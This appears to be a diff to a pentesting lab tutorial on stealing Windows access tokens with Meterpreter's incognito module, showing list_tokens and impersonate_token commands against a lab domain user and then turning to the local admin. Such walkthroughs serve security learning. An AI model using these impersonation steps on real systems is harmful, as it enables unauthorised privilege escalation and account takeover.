@@ -5,6 +5,7 @@ First of all make sure you have a `meterpreter` shell on our target system
 ```powershell
 meterpreter > load incognito
 meterpreter > list_tokens -u
+# impersonate_token domain\\user
 meterpreter > impersonate_token marvel\\fcastle
 ```
 
@@ -25,4 +26,6 @@ meterpreter > revself
 ```
 
 
-**Since we are able to dump user fcastle token and login**
+**Since we are able to dump user fcastle token and impersonate it, let do the same for the local admin, first of all switch user from fcastle to the local admin.**
+
+
